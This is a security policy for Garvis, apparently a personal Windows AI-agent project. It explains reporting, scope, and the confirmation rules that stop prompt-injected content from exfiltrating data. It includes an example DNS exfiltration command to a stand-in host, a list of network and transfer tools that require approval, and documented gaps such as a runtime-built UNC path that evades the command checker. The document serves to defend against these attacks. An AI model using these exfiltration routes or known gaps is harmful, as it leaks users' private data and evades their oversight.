# Security policy

## Reporting a vulnerability

Please **do not** report security problems in public issues, discussions or
pull requests.

Report them privately through GitHub's **private vulnerability reporting**:
open the repository's **Security** tab and choose **Report a
vulnerability**. If that button is missing, open a public issue that only
asks the maintainer for a private way to send a report. Leave out any
details of the problem.

A useful report includes:

- the affected file(s) and the version or commit;
- what an attacker can do and what they need first. For example: content
  on a web page Garvis reads, a device on the same network, or local
  access to the PC;
- steps to reproduce, ideally without real credentials or personal data;
- any suggested fix.

This is a personal project maintained on a best-effort basis. There is no
bug bounty and no guaranteed response time. Reports are acknowledged when
they are read and fixed as time allows. Please give a reasonable amount of
time before any public disclosure.

## Supported versions

Only the latest commit on the default branch is supported.

## Scope

In scope:

- **Ways around the permission and confirmation system:**
  - a tool call that runs without the confirmation its policy requires;
  - prompt injection that leads to a tool action without confirmation;
  - PowerShell commands misclassified as read-only.
- **Secret leaks:** API keys, OAuth tokens or pairing tokens reaching logs,
  tool output, the model or the phone interface.
- **Network-facing code:** the optional phone web interface (`app/mobile/`),
  including pairing, authentication, the network allowlist, TLS, and
  request handling.
- **Unsafe fetching:** SSRF or unsafe URL handling in the web-page and
  browser tools.
- **File-system misuse:** path traversal or unsafe file handling in the
  file tools.

Out of scope:

- Problems that need an attacker who already runs code as your Windows
  user.
- The behaviour of third-party services (the model provider, Google,
  Cloudflare) and of software you install yourself (Chrome, Tesseract,
  OmniRoute).
- Findings that only apply after you deliberately weaken a default, such
  as enabling the phone interface on an untrusted network or widening
  `GARVIS_MOBILE_ALLOWED_NETWORKS`.

## Network commands

A read-only command can still leak data: `nslookup <data>.evil.example`
sends whatever is in `<data>` to the attacker's DNS server. Prompt-injected
text (a web page, an email, OCR output) could ask the agent to read a file
and send it out this way. So:

- **PowerShell lookups and pings ask first** (`nslookup`, `ping`,
  `tracert`, `pathping`, `Resolve-DnsName`, `Test-Connection`,
  `Test-NetConnection`). The exception is a fixed target: loopback, or a
  short list of well-known public hosts (`8.8.8.8`, `1.1.1.1`,
  `google.com`, `cloudflare.com`, `microsoft.com`, ...) with only numeric
  or one-word options. Names on that list carry no data, and an attacker
  can't see traffic to them. Private LAN addresses also ask, because on
  shared Wi-Fi another device can own one. Targets from variables,
  sub-expressions or piped input always ask.
- **Other ways a command reaches another computer also ask:** UNC paths
  (`\\host\share`, `//host`), any URL, remote parameters (`-ComputerName`
  and its abbreviations, `-CimSession`, `-Server`, `/s` on `systeminfo` and
  `tasklist`), splatted parameters, `netsh -r`, `npm view`, `winget
  search`, `Find-Module`, and web or transfer tools (`curl`, `iwr`, `bitsadmin`, ...).
- **Model-written web addresses after reading your data ask first.** Once
  the conversation holds output from a tool that reads your own data
  (files, PowerShell, email, the screen, ...), `fetch_webpage_text`,
  `browser_navigate` and `open_website` ask before opening a URL that Garvis
  composed itself. A URL that appeared in your messages or in a search
  result or page Garvis read doesn't ask, and neither does a bare site
  (`https://host/`) whose name appeared there. Without private data in the
  conversation, browsing is unchanged.
- Approval comes only from you: the desktop dialog or a paired phone. The
  model never sees a pending request's id and has no tool that can answer
  it, so text in a page or file can't approve itself.

Accepted risks:

- A UNC path built at runtime (for example `('\' * 2) + 'host\x'` passed to
  `Get-Content`) isn't recognised. The command checker reads literal text,
  so it can't see such a path.
- Typing into a web form (`browser_type`, then Enter on a form that looks
  like a search) and desktop typing aren't covered by the address rule.
- A page can list many links and have the model pick among them, leaking a
  little data through which links it picks. Each pick is a separate call,
  so the per-turn step limit keeps this slow.
- Your remembered facts and the live desktop context are in the system
  prompt. They don't count as private data for the address rule.

## Web fetching and logs

- **DNS rebinding.** `fetch_webpage_text` resolves the host once, checks
  every address it gets (private, loopback, link-local, reserved, multicast
  and CGNAT `100.64.0.0/10` are refused), then connects to exactly those
  checked addresses. The HTTP client never looks the name up again, so a DNS
  server can't hand out a public address for the check and a private one
  for the connection. The Host header, TLS SNI and certificate check still
  use the real host name. Each redirect hop is checked and pinned the same
  way, and proxy environment variables are ignored for these fetches.
- **Controlled browser.** Chromium resolves names itself, so the browser
  can't be pinned the same way. After each `browser_navigate`, Garvis checks
  the address Chromium actually connected to for the page. If it isn't a
  public address, the page is cleared and the navigation fails, so content
  from a private host never reaches the model. A request the page already
  sent can't be taken back, and later in-page navigations and subresources
  only get the pre-navigation checks.
- **Logs.** Replies from the model are logged by length and a short hash
  only. Set `GARVIS_LOG_CONTENT_EXCERPTS=true` to add a short excerpt for
  debugging. Turning it back off doesn't remove excerpts already written to
  `data/logs/`.

## If you run Garvis

- Keep your `.env`, `config/gmail_client_secret.json` and the `data/`
  folder private. They hold your API key, OAuth tokens, paired-device
  records, the phone interface's local certificate authority, logs and
  databases.
- If a key may have been exposed, revoke it at the provider and create a new
  one. Deleting a file or a commit doesn't make an exposed key safe again.
- Leave `GARVIS_MOBILE_ENABLED=false` unless you need the phone interface,
  and allow it through Windows Firewall for **Private** networks only.
